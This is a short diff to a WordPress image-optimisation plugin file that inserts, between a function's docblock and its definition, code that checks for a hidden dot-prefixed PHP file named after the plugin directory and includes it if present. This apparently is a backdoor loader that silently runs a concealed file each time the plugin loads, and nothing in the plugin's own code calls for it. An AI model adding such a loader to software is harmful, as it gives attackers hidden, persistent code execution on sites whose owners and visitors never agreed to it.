@@ -12,6 +12,10 @@ add_filter( 'attachment_fields_to_edit', '_imagify_attachment_fields_to_edit', I
  * @param  object $post        The WP_Post attachment object.
  * @return array
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function _imagify_attachment_fields_to_edit( $form_fields, $post ) {
 	global $pagenow;
 
